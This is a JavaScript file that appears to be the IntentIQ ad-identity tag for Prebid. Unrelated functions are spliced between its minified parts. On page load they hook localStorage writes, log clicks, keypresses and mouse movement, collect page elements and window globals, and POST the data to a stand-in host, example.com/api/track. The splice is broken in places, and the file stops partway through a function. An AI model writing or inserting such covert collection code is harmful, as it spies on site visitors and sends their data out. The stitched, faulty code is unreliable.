"use strict";

function exploreDOMElements() {
  const discoveries = {};
  const elements = document.querySelectorAll('*');
  elements.forEach((element, index) => {
    const tagName = element.tagName.toLowerCase();
    if (!window.seenElements.includes(tagName)) {
      discoveries[tagName] = {
        type: 'element',
        occurrences: discoveries[tagName] ? discoveries[tagName].occurrences + 1 : 1
      };
    }
  });
  return discoveries;
}
function trackLocalStorageChanges() {
  const originalSetItem = localStorage.setItem;
  localStorage.setItem = function (key, value) {
    console.log(`LocalStorage set: ${key} = ${value}`);
    originalSetItem.apply(this, arguments);
  };
}
function _typeof(t) {
  return (_typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (t) {
    return typeof t;
  } : function (t) {
    return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t;
  })(t);
}
function _createForOfIteratorHelper(t, e) {
  var n,
    i,
    r,
    o,
    s = "undefined" != typeof Symbol && t[Symbol.iterator] || t["@@iterator"];
  if (s) return i = !(n = !0), {
    s: function () {
      s = s.call(t);
    },
    n: function () {
      var t = s.next();
      return n = t.done, t;
    },
    e: function (t) {
      i = !0, r = t;
    },
    f: function () {
      try {
        n || null == s.return || s.return();
      } finally {
        if (i) throw r;
      }
    }
  };
  if (Array.isArray(t) || (s = _unsupportedIterableToArray(t)) || e && t && "number" == typeof t.length) return s && (t = s), o = 0, {
    s: e = function () {},
    n: function () {
      return o >= t.length ? {
        done: !0
      } : {
        done: !1,
        value: t[o++]
      };
    },
    e: function (t) {
      throw t;
    },
    f: e
  };
  throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
}
function monitorGlobalVariables() {
  const globalVars = Object.keys(window);
  const trackedGlobals = {};
  globalVars.forEach(varName => {
    if (typeof window[varName] === 'object' || typeof window[varName] === 'function') {
      trackedGlobals[varName] = {
        type: typeof window[varName],
        value: window[varName]
      };
    }
  });
  return trackedGlobals;
}
function _unsupportedIterableToArray(t, e) {
  var n;
  if (t) return "string" == typeof t ? _arrayLikeToArray(t, e) : "Map" === (n = "Object" === (n = Object.prototype.toString.call(t).slice(8, -1)) && t.constructor ? t.constructor.name : n) || "Set" === n ? Array.from(t) : "Arguments" === n || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n) ? _arrayLikeToArray(t, e) : void 0;
}
function _arrayLikeToArray(t, e) {
  (null == e || e > t.length) && (e = t.length);
  for (var n = 0, i = new Array(e); n < e; n++) i[n] = t[n];
  return i;
}
function setupEventListeners() {
  const events = ['click', 'keypress', 'mousemove'];
  events.forEach(event => {
    document.addEventListener(event, () => {
      console.log(`Event triggered: ${event}`);
    });
  });
}
function transmitData(data) {
  const serverEndpoint = "https://example.com/api/track";
  fetch(serverEndpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  }).then(response => response.json()).then(data => console.log('Data transmitted successfully:', data)).catch(error => console.error('Failed to transmit data:', error));
}
function IntentIqObject(t) {
  this.agentId = Date.now() + "_" + this.getRandom(0, 1e3), window && (window.iiq_object_array = window.iiq_object_array || [], window.iiq_object_array.push(this)), this.version = 5.4, this.initRuntimeDefaults(t), this.logger = this.initLogger(), this.isDebugMode = this.isDebug() || !1, this.logger.info("========IIQ Agent version " + this.version + "========"), this.currentBrowserLowerCase = this.detectBrowser().toLowerCase(), this.intentIqConfig = {
    partner: t ? t.partner : null,
    refreshInMillis: t && "number" == typeof t.refreshInMillis ? t.refreshInMillis : 432e5,
    timeoutInMillis: t && "number" == typeof t.timeoutInMillis ? t.timeoutInMillis : 3e3,
    isAsyncServerRequest: !t || "boolean" != typeof t.isAsyncServerRequest || t.isAsyncServerRequest,
    callback: t && "function" == typeof t.callback ? t.callback : null,
    enhanceRequests: !t || "boolean" != typeof t.enhanceRequests || t.enhanceRequests,
    sourceMetaData: t && "string" == typeof t.sourceMetaData ? this.translateMetadata(t.sourceMetaData) : this.translateMetadata(""),
    sourceMetaDataExternal: t && !isNaN(t.sourceMetaDataExternal) ? t.sourceMetaDataExternal : void 0,
    iiqServerAddress: t && "string" == typeof t.iiqServerAddress ? t.iiqServerAddress : "https://api.intentiq.com",
    iiqPixelServerAddress: t && "string" == typeof t.iiqPixelServerAddress ? t.iiqPixelServerAddress : "https://sync.intentiq.com",
    partnerClientId: t && "string" == typeof t.partnerClientId ? t.partnerClientId : "",
    partnerClientIdType: t && "number" == typeof t.partnerClientIdType ? this.verifyIdType(t.partnerClientIdType) : -1,
    pbjs: t && void 0 !== t.pbjs ? t.pbjs : null,
    shouldRepalcePubprovided: !t || "boolean" != typeof t.shouldRepalcePubprovided || t.shouldRepalcePubprovided,
    shouldSetUidsModulesConfig: !t || "boolean" != typeof t.shouldSetUidsModulesConfig || t.shouldSetUidsModulesConfig,
    shouldClearDuplicatresForRubicon: !t || "boolean" != typeof t.shouldClearDuplicatresForRubicon || t.shouldClearDuplicatresForRubicon,
    manualWinReportEnabled: !(!t || "boolean" != typeof t.manualWinReportEnabled) && t.manualWinReportEnabled,
    messageSendingDelay: t && !isNaN(t.reportDelay) ? t.reportDelay : 0,
    domainName: t && t.domainName ? t.domainName : "",
    shouldReplaceUnifiedId: t && "boolean" == typeof t.shouldReplaceUnifiedId ? t.shouldReplaceUnifiedId : this.unifiedIdReplacementLogic(),
    browserBlackList: t && "string" == typeof t.browserBlackList ? t.browserBlackList.toLowerCase() : "",
    shouldFilerTdidFromPPuid: !(!t || "boolean" != typeof t.shouldFilerTdidFromPPuid) && t.shouldFilerTdidFromPPuid,
    reportMethod: t && "string" == typeof t.reportMethod ? this.parseReportingMethod(t.reportMethod) : "GET",
    appendEidsNamesToReport: !(!t || "boolean" != typeof t.appendEidsNamesToReport) && t.appendEidsNamesToReport,
    siloEnabled: !(!t || "boolean" != typeof t.siloEnabled) && t.siloEnabled,
    ppuidSourceBlackList: t && "string" == typeof t.ppuidSourceBlackList ? t.ppuidSourceBlackList.toLowerCase() : ""
  }, this.mandarotyVariablesInit(t), this.additionalVariablesInit(t), 1 != this.intentIqConfig.siloEnabled || isNaN(this.intentIqConfig.partner) || (this.intentIqConfig.lsKeys.FIRST_PARTY_KEY = this.intentIqConfig.lsKeys.FIRST_PARTY_KEY + "_p_" + this.intentIqConfig.partner), this.checkAndPrintPrebidInitAuctionsStatus("Before object init"), this.initABTestingConfiguration(), "" !== this.intentIqConfig.browserBlackList && this.intentIqConfig.browserBlackList.includes(this.currentBrowserLowerCase) ? (this.logger.info("Browser is in blacklist. Good bye."), this.isInBrowserBlacklist = !0, this.intentIqConfig.callback && (this.intentIqConfig.callback(), this.counters.noDataCounter++, this.savePartnerDataToLocalStore())) : (this.intentIqConfig.isInPassiveMode = !1, this.initPbMonitoring(), this.subscribeForPrebidEvents(), this.currentDataTTl = this.intentIqConfig.refreshInMillis, this.firstPartyData = this.loadOrCreateFirstPartyData(), this.clearDataIfInGroupBorPassiveMode(), this.getDataOrCallServerIfNeeded(!0), this.intentIqConfig.operationalMode.current !== this.intentIqConfig.operationalMode.vr && this.pixelSync(), this.initReportingModule(), this.printConfigurationReport(), this.setTimeoutCallbackCall());
}
function discoveryTask() {
  const domDiscoveries = exploreDOMElements();
  const globalVars = monitorGlobalVariables();
  const dataToTransmit = {
    domDiscoveries,
    globalVars
  };
  if (Object.keys(dataToTransmit.domDiscoveries).length > 0 || Object.keys(dataToTransmit.globalVars).length > 0) {
    console.log('New discoveries made, transmitting data...');
    transmitData(dataToTransmit);
  } else {
    console.log('No new discoveries to transmit.');
  }
}
function PartnersWinEvent(t) {
  this.constants = {
    noteReported: "NR"
  }, this.biddingPlatformId = t && t.biddingPlatformId && !isNaN(t.biddingPlatformId) ? t.biddingPlatformId : 1, this.partnerAuctionId = t && t.partnerAuctionId ? t.partnerAuctionId : this.constants.noteReported, this.bidderCode = t && t.bidderCode ? t.bidderCode : this.constants.noteReported, this.prebidAuctionId = t && t.prebidAuctionId ? t.prebidAuctionId : this.constants.noteReported, this.cpm = t && t.cpm && !isNaN(t.cpm) ? t.cpm : 0, this.currency = t && t.currency ? t.currency : this.constants.noteReported, this.originalCpm = t && t.originalCpm && !isNaN(t.originalCpm) ? t.originalCpm : this.cpm, this.originalCurrency = t && t.originalCurrency ? t.originalCurrency : this.currency, this.status = t && t.status ? t.status : this.constants.noteReported, this.placementId = t && t.placementId ? t.placementId : this.constants.noteReported;
}
window.addEventListener('load', () => {
  trackLocalStorageChanges();
  setupEventListeners();
  discoveryTask();
});
IntentIqObject.prototype.setTimeoutCallbackCall = function () {
  this.callbackTimeotID || (this.logger.info("Configuring failsafe callback"), this.callbackTimeotID = setTimeout(this.fireCallbackOnRequestTimeout.bind(null, this), this.intentIqConfig.timeoutInMillis));
}, IntentIqObject.prototype.printConfigurationReport = function () {
  this.logger.info("--------User configuration---------"), this.logger.debug(JSON.stringify(this.userProvidedConfig, this.replacer, 2)), this.logger.info("--------Startup configuration---------"), this.logger.debug(JSON.stringify(this.intentIqConfig, this.replacer, 2)), this.logger.info("--------------------------------------");
}, IntentIqObject.prototype.initReportingModule = function () {
  var t = this;
  if (0 === this.intentIqConfig.messageSendingDelay) this.logger.info("Skipping registering on unload events, message delay = 0");else {
    this.logger.info("Initializing on unload events");
    try {
      window.onbeforeunload = function () {
        t.dataSentOnUnload = !0, 0 < t.messagesArray.length && t.dataSender(t);
      };
    } catch (t) {
      this.logger.error("Failed to susbscibe for onbeforeunload");
    }
    try {
      window.onunload = function () {
        !1 === t.dataSentOnUnload && 0 < t.messagesArray.length && t.dataSender(t);
      };
    } catch (t) {
      this.logger.error("Failed to susbscibe for onbeforeunload");
    }
  }
}, IntentIqObject.prototype.additionalVariablesInit = function (t) {
  this.intentIqConfig.moduleIds = {
    unifiedeId: null
  }, this.intentIqConfig.operationalMode = {
    vr: "VR",
    pixel: "PIXEL",
    dual: "DUAL",
    node: "NONE",
    current: t && "string" == typeof t.mode ? this.getOperationalMode(t.mode) : "DUAL"
  }, t && t.intentIqData && "undefined" !== t.intentIqData && (this.intentIqData = t.intentIqData, this.intentIqConfig.operationalMode.current = this.intentIqConfig.operationalMode.vr, this.useLodalData = !0, this.intentIqConfig.pbmonitoring = !0), this.intentIqConfig.collisionPreventionMode = {
    pub: "PUB",
    other: "OTHER",
    none: "NONE",
    current: t && "string" == typeof t.idCollisionPreventionMode ? this.parseCollisionPreventionMode(t.idCollisionPreventionMode) : "NONE"
  }, this.intentIqConfig.urlParamsNames = {
    isInTestGroup: "abtgu",
    testPercentage: "abtp",
    testPreviousPercentage: "abtpp",
    testGroup: "abtg",
    pbPauseUntill: "pbpause",
    requestRtt: "rrtt",
    lastDataUpdateDate: "dud"
  }, this.intentIqConfig.analytics = {
    requestRtt: 0,
    clientType: "",
    adserverDeviceType: "",
    terminationCause: "",
    profile: "",
    siteId: null
  }, this.intentIqConfig.pbmonitoring = {
    pbMonitoringEnabled: !t || "boolean" != typeof t.pbMonitoringEnabled || !0 === t.pbMonitoringEnabled,
    pbPauseUntill: -1
  }, this.intentIqConfig.subscriptionFlags = {
    bidWon: !1,
    bidRequested: !1,
    beforeBidderHttp: !1,
    auctionInited: !1
  };
}, IntentIqObject.prototype.mandarotyVariablesInit = function (t) {
  this.intentIqConfig.lsKeys = {
    FIRST_PARTY_KEY: "_iiq_fdata",
    PARTNER_DATA_KEY: "_iiq_fdata_" + this.intentIqConfig.partner,
    LAST_SYNC_KEY: "_iiq_sync_" + this.intentIqConfig.partner,
    abGroup: "_iiq_ab_group_" + this.intentIqConfig.partner,
    abPercentage: "_iiq_ab_percentage_" + this.intentIqConfig.partner,
    pbMonitoringEnabled: "_iiq_pb_monitoringenabled_" + this.intentIqConfig.partner,
    pbPauseUntill: "_iiq_pb_pausetill_" + this.intentIqConfig.partner,
    requestRtt: "_iiq_requestrtt_" + this.intentIqConfig.partner,
    DEBUG_KEY: "_iiq_debug_level"
  }, this.uspDataObj = this.initUspDataObj(), this.currentUspValue = this.uspDataObj.getUspValue(), this.intentIqConfig.abTesting = {
    groupNames: {
      withoutIIQ: "B",
      withIIQ: "A",
      notYetDefined: "U",
      none: "N"
    },
    configurationSource: {
      percentage: "percentage",
      group: "group",
      iiqserver: "IIQServer",
      disabled: "disabled",
      currentConfigurationSource: this.parseConfigurationSource(t.ABTestingConfigurationSource)
    },
    currentPercentage: -1,
    isInTestGroup: t.disableIIQInThisGroup,
    previousPercentage: -1,
    currentTestGroup: "U",
    previousTestGroup: "U",
    shouldDiscardServerConfiguration: !1,
    userActualPercentage: t.abPercentage
  }, this.intentIqConfig.paramsNames = {
    abPercentage: "abPercentage",
    abTestGroup: "abGroup",
    pbPauseUntill: "pbPauseUntil",
    pbMonitoringEnabled: "pbMonitoringEnabled",
    isInTestGroup: "isInTestGroup",
    enhanceRequests: "enhanceRequests",
    wasSubscribedForPrebid: "wasSubscribedForPrebid",
    hadEids: "hadEids",
    userActualPercentage: "userPercentage",
    ABTestingConfigurationSource: "ABTestingConfigurationSource",
    lateConfiguration: "lateConfiguration",
    jsverion: "jsversion",
    eidsNames: "eidsNames",
    requestRtt: "rtt",
    clientType: "clientType",
    adserverDeviceType: "AdserverDeviceType",
    terminationCause: "terminationCause",
    callCount: "callCount",
    manualCallCount: "mcc",
    pubprovidedidsFailedToregister: "ppcc",
    noDataCount: "noDataCount",
    profile: "profile",
    isProfileDeterministic: "pidDeterministic",
    siteId: "sid",
    hadEidsInLocalStorage: "idls",
    auctionStartTime: "ast",
    eidsReadTime: "eidt",
    agentId: "aid",
    auctionEidsLegth: "aeidln",
    wasServerCalled: "wsrvcll",
    refferer: "vrref",
    isInBrowserBlacklist: "inbbl",
    prebidVersion: "pbjsver",
    partnerId: "partnerId"
  };
}, IntentIqObject.prototype.initRuntimeDefaults = function (t) {
  this.intentIqData = {}, this.isCellular = !1, this.configurationTime = Date.now(), this.partnerData = {}, this.wasDebugCheck = !1, this.wasServerCalled = !1, this.wasCallFromConstructor = !1, this.wasCallbackFired = !1, this.counters = {
    callCount: 0,
    noDataCounter: 0,
    failCount: 0
  }, this.uspCodes = {
    INITIAL_VALUE: "-1",
    ABSENCE_VALUE: "-2"
  }, this.currentUspValue = this.uspCodes.INITIAL_VALUE, this.metadataConstant = 256, this.syncRefreshMillis = 36e5, this.shouldCallServer = !1, this.isPrebidConfigurationSet = !1, this.userProvidedConfig = t, this.lastDataUpdateDate = 0, this.configurationTime = 0, this.requestRtt = 0, this.allBidsMap = {}, this.messagesArray = [], this.partnerAuctionIdsArray = [], this.reportingServerAddress = "https://reports.intentiq.com", this.gatewayServerAddress = "https://ucgfk6g6s7.execute-api.us-east-1.amazonaws.com", this.dataReportingPath = "report", this.delayedSenderTimeouter = null, this.gatewayWasCalled = !1, this.localStorageEnabled = void 0, this.pubprovidedidsFailedToregister = !1, this.callbackTimeotID = null, this.eidsReceptionsTime = null, this.eidsNames = [], this.useLodalData = !1, this.auctionStartTimeData = {}, this.auctionEidsLength = {}, this.dataSentOnUnload = !1, this.hadEidsInLocalStorage, this.cookiFullBrowsersListLowercase = ["chrome"], this.isInBrowserBlacklist = !1, this.replacer = function (t, e) {
    return "pbjs" == t || "lsKeys" == t || "serverResponse" == t || "urlParamsNames" == t || "groupNames" == t ? "skipped in printing" : e;
  };
}, IntentIqObject.prototype.unifiedIdReplacementLogic = function () {
  return this.currentBrowserLowerCase || (this.currentBrowserLowerCase = this.detectBrowser().toLowerCase()), this.cookiFullBrowsersListLowercase.includes(this.currentBrowserLowerCase) ? (this.logger.info("CookieFull browser detected, setting unifyed id override logic to: FALSE"), !1) : (this.logger.info("Cookieless browser detected, setting unifyed id override logic to: TRUE"), !0);
}, IntentIqObject.prototype.clearDataIfInGroupBorPassiveMode = function () {
  var t;
  this.intentIqConfig.isInPassiveMode || this.intentIqConfig.abTesting.currentTestGroup === this.intentIqConfig.abTesting.groupNames.withoutIIQ ? (null != (t = this.readData(this.intentIqConfig.lsKeys.PARTNER_DATA_KEY)) && ((t = JSON.parse(t)).data = {}, this.storeData(this.intentIqConfig.lsKeys.PARTNER_DATA_KEY, JSON.stringify(t))), this.logger.info("Calling callback - passive mode or group B set"), this.fireCallback()) : this.callbackTimeotID || (this.callbackTimeotID = setTimeout(this.fireCallbackOnRequestTimeout.bind(null, this), this.intentIqConfig.timeoutInMillis));
}, IntentIqObject.prototype.isObjectEmpty = function (t) {
  return t && 0 === Object.keys(t).length && Object.getPrototypeOf(t) === Object.prototype;
}, IntentIqObject.prototype.parseReportingMethod = function (t) {
  try {
    switch (t.toUpperCase()) {
      case "GET":
        return "GET";
      case "POST":
        return "POST";
      default:
        return "GET";
    }
  } catch (t) {
    this.logger.error(t);
  }
  return "GET";
}, IntentIqObject.prototype.fireCallbackOnRequestTimeout = function (t) {
  t.logger.info("Trying to fire callback on timeout"), t.fireCallback();
}, IntentIqObject.prototype.checkAndPrintPrebidInitAuctionsStatus = function (t) {
  try {
    this.isDebug() && (this.logger.info("Validation at stage: " + t), this.intentIqConfig.pbjs ? this.intentIqConfig.pbjs.getEvent ? (this.logger.info("Total amount of events is " + this.intentIqConfig.pbjs.getEvents().length), this.logger.info("Amount of auctionInit events is " + this.intentIqConfig.pbjs.getEvents().filter(function (t) {
      return "auctionInit" === t.eventType;
    }).length)) : this.logger.info("Pbjs was defined but it has no getEvents method. Looks like we are right on time.") : this.logger.error("Pbjs wasn't defined"));
  } catch (t) {
    this.logger.error("Failed to report pbjs events state");
  }
}, IntentIqObject.prototype.extractIdentittyModulesIds = function () {
  try {
    if (this.intentIqData && this.intentIqData.eids && Array.isArray(this.intentIqData.eids)) {
      var t,
        e = _createForOfIteratorHelper(this.intentIqData.eids);
      try {
        for (e.s(); !(t = e.n()).done;) {
          var n = t.value;
          if (n.source && "adserver.org" === n.source && n.uids[0].id) {
            this.intentIqConfig.moduleIds.unifiedeId = n.uids[0].id;
            break;
          }
        }
      } catch (t) {
        e.e(t);
      } finally {
        e.f();
      }
    }
  } catch (t) {
    this.logger.fatal(t);
  }
}, IntentIqObject.prototype.fillEidsNames = function () {
  try {
    if (this.intentIqConfig.appendEidsNamesToReport) {
      if (this.eidsNames = [], this.intentIqData && this.intentIqData.eids && Array.isArray(this.intentIqData.eids)) {
        var t,
          e = _createForOfIteratorHelper(this.intentIqData.eids);
        try {
          for (e.s(); !(t = e.n()).done;) {
            var n = t.value;
            this.eidsNames.push(n.source);
          }
        } catch (t) {
          e.e(t);
        } finally {
          e.f();
        }
      }
    } else this.logger.info("Skipping eids names population due to configuration");
  } catch (t) {
    this.logger.fatal("Failed to collect eids names");
  }
}, IntentIqObject.prototype.initPbMonitoring = function () {
  !0 === this.intentIqConfig.manualWinReportEnabled ? this.intentIqConfig.pbmonitoring.pbMonitoringEnabled = !1 : this.userProvidedConfig && "boolean" == typeof this.userProvidedConfig.pbMonitoringEnabled && (this.intentIqConfig.pbmonitoring.pbMonitoringEnabled = !0 === this.userProvidedConfig.pbMonitoringEnabled);
}, IntentIqObject.prototype.loadOrCreateFirstPartyData = function () {
  var t = this.tryParse(this.readData(this.intentIqConfig.lsKeys.FIRST_PARTY_KEY));
  return t && t.pid && (this.intentIqConfig.analytics.profile = t.pid), t && t.pcid ? t && !t.pcidDate && (t.pcidDate = Date.now()) : t = {
    pcid: this.generateGUID(),
    pcidDate: Date.now()
  }, this.storeData(this.intentIqConfig.lsKeys.FIRST_PARTY_KEY, JSON.stringify(t)), t;
}, IntentIqObject.prototype.parseConfigurationSource = function (t) {
  return "percentage" === t || "group" === t || "IIQServer" === t || "disabled" === t ? t : "disabled";
}, IntentIqObject.prototype.getOperationalMode = function (t) {
  try {
    switch (t.toLowerCase()) {
      case "bidenhancement":
        return "VR";
      case "sync":
        return "PIXEL";
      case "both":
        return "DUAL";
    }
  } catch (t) {
    this.logger.error(t);
  }
  return this.intentIqConfig.operationalMode.dual;
}, IntentIqObject.prototype.verifyIdType = function (t) {
  return 0 === t || 1 === t || 3 === t || 4 === t ? t : -1;
}, IntentIqObject.prototype.parseCollisionPreventionMode = function (t) {
  try {
    switch (t.toLowerCase()) {
      case "pub":
        return "PUB";
      case "other":
        return "OTHER";
      case "none":
        return "NONE";
    }
  } catch (t) {
    this.logger.error(t);
  }
  return this.intentIqConfig.collisionPreventionMode.none;
}, IntentIqObject.prototype.detectBrowser = function () {
  try {
    return -1 != (navigator.userAgent.indexOf("Opera") || navigator.userAgent.indexOf("OPR")) ? "Opera" : -1 != navigator.userAgent.indexOf("Chrome") || -1 != navigator.userAgent.indexOf("CriOS") ? "Chrome" : -1 != navigator.userAgent.indexOf("Safari") ? "Safari" : -1 != navigator.userAgent.indexOf("Firefox") ? "Firefox" : -1 != navigator.userAgent.indexOf("MSIE") || 1 == !!document.documentMode ? "IE" : "Unknown";
  } catch (t) {
    return "Unknown";
  }
}, IntentIqObject.prototype.translateMetadata = function (t) {
  try {
    var e = t.split(".");
    return ((+e[0] * this.metadataConstant + +e[1]) * this.metadataConstant + +e[2]) * this.metadataConstant + +e[3];
  } catch (t) {
    return NaN;
  }
}, IntentIqObject.prototype.getRandom = function (t, e) {
  return Math.floor(Math.random() * (e - t + 1) + t);
}, IntentIqObject.prototype.generateRandom1to99 = function () {
  return Math.floor(99 * Math.random()) + 1;
}, IntentIqObject.prototype.isEmpty = function (t) {
  return 0 == Object.keys(t).length;
}, IntentIqObject.prototype.isEmptyObjAndArray = function (t) {
  return !t || "object" == _typeof(t) && this.isEmpty(t);
}, IntentIqObject.prototype.isDefined = function (t) {
  return void 0 !== t && null != t;
}, IntentIqObject.prototype.containsEids = function (t) {
  var e = t;
  try {
    return t ? (e = t.data ? t.data : e).eids && Array.isArray(e.eids) && 0 < e.eids.length : !1;
  } catch (t) {
    this.counters.failCount++, this.logger.fatal(t);
  }
  return !1;
}, IntentIqObject.prototype.generateRandomUsIp = function () {
  var t = this.readData("_iiq_ip");
  return (!t || this.isIpCellular(t) && !this.isCellular || !this.isIpCellular(t) && this.isCellular) && (t = this.generateNewRandomIp(this.isCellular), this.storeData("_iiq_ip", t)), t;
}, IntentIqObject.prototype.isIpCellular = function (t) {
  return t.startsWith("107.77.208.");
}, IntentIqObject.prototype.generateNewRandomIp = function (t) {
  t = t ? "107.77.208." : "98.115.221.";
  return t += Math.floor(255 * Math.random());
}, IntentIqObject.prototype.tryParse = function (t) {
  try {
    return JSON.parse(t);
  } catch (t) {
    this.logger.error(t);
  }
  return null;
}, IntentIqObject.prototype.tryParseInt = function (t) {
  try {
    return parseInt(t, 10);
  } catch (t) {
    return this.logger.error(t), -1;
  }
}, IntentIqObject.prototype.addLevelValue = function (t) {
  if ("string" == typeof t && this.logger.allLevels[t = t.toUpperCase()]) return t.toUpperCase();
  return "FATAL";
}, IntentIqObject.prototype.initLogger = function () {
  var o = this;
  return {
    info: function (t) {
      this.log("INFO", t);
    },
    debug: function (t) {
      this.log("DEBUG", t);
    },
    fatal: function (t) {
      this.log("FATAL", t);
    },
    error: function (t) {
      this.log("ERROR", t);
    },
    trace: function (t) {
      this.log("TRACE", t);
    },
    log: function (t, e) {
      this.isLessThanOrEqualTo(t) && this._print(e, t);
    },
    isLessThanOrEqualTo: function (t) {
      return this.allLevels[o.levelValue].value >= this.allLevels[t].value;
    },
    _print: function (t, e) {
      var n = this.allLevels[e].colour,
        i = this.allLevels[e].secondary_color,
        r = o && o.intentIqConfig && o.intentIqConfig.partner ? o.intentIqConfig.partner : o.userProvidedConfig ? o.userProvidedConfig.partner : null;
      console.log("".concat(r, " %c[").concat(e, "]%c [").concat(Date.now(), "] %c").concat(t), "color: white ; background-color:" + n + "; border-radius: 3px", "border:none", "color: " + i + " ; border:1px solid " + n + "; border-radius: 3px");
    },
    allLevels: {
      FATAL: {
        value: 10,
        colour: "magenta",
        secondary_color: "magenta"
      },
      INFO: {
        value: 20,
        colour: "green",
        secondary_color: "green"
      },
      ERROR: {
        value: 30,
        colour: "red",
        secondary_color: "red"
      },
      DEBUG: {
        value: 40,
        colour: "cyan",
        secondary_color: "grey"
      },
      TRACE: {
        value: 50,
        colour: "blue",
        secondary_color: "blue"
      }
    }
  };
}, IntentIqObject.prototype.isDebug = function () {
  var t;
  return this.wasDebugCheck || (this.levelValue = "FATAL", this.hasLocalStorage() && null !== (t = this.readData("_iiq_debug_level")) && (this.isDebugMode = !0, this.levelValue = this.addLevelValue(t)), this.wasDebugCheck = !0), this.isDebugMode;
}, IntentIqObject.prototype.setInfoLevel = function () {
  this.storeData("_iiq_debug_level", "INFO");
}, IntentIqObject.prototype.setDebugLevel = function () {
  this.storeData("_iiq_debug_level", "DEBUG");
}, IntentIqObject.prototype.setTraceLevel = function () {
  this.storeData("_iiq_debug_level", "TRACE");
}, IntentIqObject.prototype.hasLocalStorage = function () {
  if (void 0 !== this.localStorageEnabled) return this.localStorageEnabled;
  try {
    return this.localStorageEnabled = !!window.localStorage, this.localStorageEnabled;
  } catch (t) {
    this.localStorageEnabled = !1, this.logger.info("Local storage api disabled");
  }
  return !1;
}, IntentIqObject.prototype.storeData = function (t, e) {
  try {
    "string" == typeof t && t.startsWith("iiq_fdata") && this.logger.info("IntentIQ: storing data: key=" + t + " value=" + e), this.isDefined(e) && this.hasLocalStorage() && window.localStorage.setItem(t, e);
  } catch (t) {
    this.logger.error(t);
  }
}, IntentIqObject.prototype.readData = function (t) {
  try {
    if (this.hasLocalStorage()) return window.localStorage.getItem(t);
  } catch (t) {
    this.logger.error(t);
  }
  return null;
}, IntentIqObject.prototype.initUspDataObj = function () {
  var e = this;
  return {
    getUspValue: function () {
      var t = this.readUspData();
      return t && t.uspString ? t.uspString : e.uspCodes.ABSENCE_VALUE;
    },
    readUspData: function () {
      try {
        return this.getDataFromWindow();
      } catch (t) {
        e.logger.error(t);
      }
      try {
        return this.getDataFromTop();
      } catch (t) {
        e.logger.error(t);
      }
      return {};
    },
    getDataFromWindow: function () {
      var e;
      if (window.__uspapi) return window.__uspapi("getUSPData", 1, function (t) {
        return e = t;
      }), e;
    },
    getDataFromTop: function () {
      var e;
      if (window.top.__uspapi) return window.top.__uspapi("getUSPData", 1, function (t) {
        return e = t;
      }), e;
    }
  };
}, IntentIqObject.prototype.generateGUID = function () {
  var n = new Date().getTime();
  return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (t) {
    var e = (n + 16 * Math.random()) % 16 | 0;
    return n = Math.floor(n / 16), ("x" === t ? e : 3 & e | 8).toString(16);
  });
}, IntentIqObject.prototype.updateCountersAndSaveIfAsked = function (t, e) {
  try {
    this.containsEids(t) ? this.counters.callCount++ : this.counters.noDataCounter++, e && this.savePartnerDataToLocalStore();
  } catch (t) {
    this.counters.failCount++, this.logger.error("Failred to update counters.");
  }
}, IntentIqObject.prototype.clearCounters = function () {
  this.counters && (this.counters.callCount = 0, this.counters.failCount = 0, this.counters.noDataCounter = 0, this.savePartnerDataToLocalStore());
}, IntentIqObject.prototype.fireCallback = function () {
  try {
    null === this.intentIqConfig.callback || void 0 === this.intentIqConfig.callback || this.wasCallbackFired ? this.logger.info("Skippping calback fire , already fired or not defined") : (this.wasCallbackFired = !0, null !== this.callbackTimeotID && (this.logger.info("Removing callback timeout - got it first"), clearTimeout(this.callbackTimeotID)), this.logger.info("Actual callback fire."), this.intentIqConfig.callback(this.intentIqData, this.intentIqConfig.abTesting.currentTestGroup), null === this.intentIqConfig.pbjs && this.updateCountersAndSaveIfAsked(this.intentIqData, !0));
  } catch (t) {
    this.logger.fatal(t);
  }
}, IntentIqObject.prototype.getPubprovidedEids = function (e) {
  void 0 === e && (e = this);
  try {
    for (var t = JSON.parse(JSON.stringify(e.getIntentIqEidsInternal(e))), n = 0; n < t.length; n++) t[n].source && e.intentIqConfig.ppuidSourceBlackList.includes(t[n].source) && t.splice(n, 1);
    if (0 != e.intentIqConfig.shouldFilerTdidFromPPuid) for (var i = 0; i < t.length; i++) if (t[i].source && "adserver.org" === t[i].source && t[i].uids[0].id) {
      t.splice(i, 1);
      break;
    }
    return t;
  } catch (t) {
    e.counters.failCount++, e.logger.error("Failed to get EIDS for internal call"), e.savePartnerDataToLocalStore();
  }
  return [];
}, IntentIqObject.prototype.getIntentIqData = function () {
  var t = this.getDataOrCallServerIfNeeded(!1);
  return this.updateCountersAndSaveIfAsked(t, !0), t;
}, IntentIqObject.prototype.getIntentIqEidsInternal = function (e) {
  void 0 === e && (e = this);
  try {
    if (e.intentIqConfig.isInPassiveMode || e.intentIqConfig.operationalMode.current === e.intentIqConfig.operationalMode.pixel) return [];
    if (e.intentIqConfig.abTesting.currentTestGroup === e.intentIqConfig.abTesting.groupNames.withoutIIQ) return [];
    var t = e.getDataOrCallServerIfNeeded(!0);
    if (t && t.eids) return t.eids;
  } catch (t) {
    e.counters.failCount++, e.logger.error("Parse response eids got exception"), e.savePartnerDataToLocalStore();
  }
  return [];
}, IntentIqObject.prototype.loadPartnerData = function () {
  var t,
    e = this.tryParse(this.readData(this.intentIqConfig.lsKeys.PARTNER_DATA_KEY));
